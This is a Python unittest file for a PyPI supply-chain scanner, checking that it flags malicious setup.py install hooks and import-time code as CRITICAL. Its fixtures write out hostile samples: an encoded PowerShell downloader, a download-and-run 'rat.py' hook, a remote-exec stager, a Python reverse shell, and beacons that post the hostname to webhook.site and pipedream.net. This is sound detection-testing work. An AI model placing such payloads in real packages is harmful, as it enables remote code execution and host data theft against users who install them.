"""Registry verdicts on the audit's PyPI blind spots (0.1.7): what pip runs to
install an sdist — setup.py and the modules it imports, now also from src/
and through relative imports — fails on encoded PowerShell, a stager string,
a reverse shell, host information sent out and a download that is run; and
the modules a package's top-level modules import (wheel or sdist) get the
import-time test, CRITICAL for the shapes no library needs.

Payloads are inert: hosts are .invalid, nothing is extracted or executed.
"""
import base64
import unittest

from tests.registry._review_support import issues, scan_sdist, scan_wheel

WHEEL_META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"}
SETUP = "from setuptools import setup\nsetup(name='x')\n"
PS_RUN = base64.b64encode('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
                          'Invoke-Expression "a.exe"'.encode("utf-16-le")).decode()


def hooks(res):
    return sorted((i["file"], i["sev"], i["msg"]) for i in issues(res, "SC-INSTALL-HOOK"))


def imports(res):
    return sorted((i["file"], i["sev"]) for i in issues(res, "SC-IMPORT-RISK"))


class SetupPyTests(unittest.TestCase):
    def test_encoded_powershell(self):
        res = scan_sdist({"setup.py": "import subprocess\nsubprocess.Popen('powershell -WindowStyle Hidden "
                                      f"-EncodedCommand {PS_RUN}', shell=False)\n" + SETUP})
        self.assertEqual(hooks(res), [("setup.py", "CRITICAL", "setup.py runs when pip builds or installs this sdist, "
                                       "and it runs an encoded PowerShell command that downloads and runs code.")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_a_download_that_is_run(self):
        res = scan_sdist({"setup.py": ("import requests, subprocess, sys\nfrom setuptools.command.install import install\n"
                                       "class I(install):\n    def run(self):\n"
                                       "        r = requests.get('https://cdn.invalid/rat.py')\n"
                                       "        with open('rat.py', 'wb') as f:\n            f.write(r.content)\n"
                                       "        subprocess.check_call([sys.executable, 'rat.py'])\n" + SETUP)})
        self.assertEqual(hooks(res), [("setup.py", "CRITICAL", "setup.py runs when pip builds or installs this sdist, "
                                       "and it downloads a file and then runs it.")])

    def test_a_stager_and_a_reverse_shell(self):
        stager = ('import tempfile, os, sys\nt = tempfile.NamedTemporaryFile(delete=False)\n'
                  't.write(b"""from urllib.request import urlopen as u;exec(u(\'https://x.invalid/p\').read())""")\n'
                  't.close()\nos.system(f"start {sys.executable} {t.name}")\n')
        shell = ("import socket, os, subprocess\ns = socket.socket()\ns.connect(('10.0.0.1', 4444))\n"
                 "os.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nsubprocess.call(['/bin/sh', '-i'])\n")
        for text, reason in ((stager, "carries a script that downloads and runs code"), (shell, "opens a reverse shell")):
            with self.subTest(reason):
                res = scan_sdist({"setup.py": text + SETUP})
                (hit,) = issues(res, "SC-INSTALL-HOOK")
                self.assertEqual(hit["sev"], "CRITICAL")
                self.assertIn(reason, hit["msg"])

    def test_the_package_setup_py_imports_from_src(self):
        res = scan_sdist({"setup.py": "import x\n" + SETUP, "src/x/__init__.py": "from .beacon import send\nsend()\n",
                          "src/x/beacon.py": ("import socket, requests\ndef send():\n"
                                              "    requests.post('https://x.invalid/b', json={'h': socket.gethostname()})\n")})
        self.assertEqual(hooks(res), [("src/x/beacon.py", "CRITICAL", "src/x/beacon.py runs when pip builds or installs "
                                       "this sdist, and it sends the machine's user or host name over the network.")])

    def test_an_ordinary_setup_py(self):
        res = scan_sdist({"setup.py": ("import os, subprocess\nfrom setuptools import setup\n"
                                       "version = subprocess.check_output(['git', 'describe']).decode().strip()\n"
                                       "setup(name='x', version=version)\n"), "x/__init__.py": "__version__ = '1'\n"})
        self.assertEqual((hooks(res), imports(res), res["verdict"]), ([], [], "OK"))


class ImportReachTests(unittest.TestCase):
    def test_a_wheel_module_its_package_imports(self):
        res = scan_wheel({**WHEEL_META, "x/__init__.py": "from .core import go\ngo()\n",
                          "x/core.py": ("import urllib.request\ndef go():\n"
                                        "    exec(urllib.request.urlopen('https://x.invalid/p').read())\n"),
                          "x/unused.py": ("import urllib.request\n"
                                          "exec(urllib.request.urlopen('https://x.invalid/q').read())\n")})
        self.assertEqual(imports(res), [("x/core.py", "CRITICAL")])     # unused.py: nothing imports it
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_absolute_and_from_imports(self):
        res = scan_wheel({**WHEEL_META, "x/__init__.py": "import x.a\nfrom x import b\nfrom x.c import thing\n",
                          "x/a.py": "A = 1\n", "x/b.py": "B = 1\n",
                          "x/c.py": ("import socket, requests\ndef thing():\n"
                                     "    requests.post('https://pipedream.net/x', data=socket.gethostname())\n")})
        self.assertEqual(imports(res), [("x/c.py", "CRITICAL")])

    def test_an_sdist_package(self):
        res = scan_sdist({"setup.py": SETUP, "x/__init__.py": "from . import telemetry\n",
                          "x/telemetry.py": ("import socket, requests\n"
                                             "requests.post('https://webhook.site/0', json={'h': socket.gethostname()})\n"),
                          "tests/test_x.py": ("import socket, requests\n"
                                              "requests.post('https://webhook.site/1', json={'h': socket.gethostname()})\n")})
        self.assertEqual(imports(res), [("x/telemetry.py", "CRITICAL")])


if __name__ == "__main__":
    unittest.main()
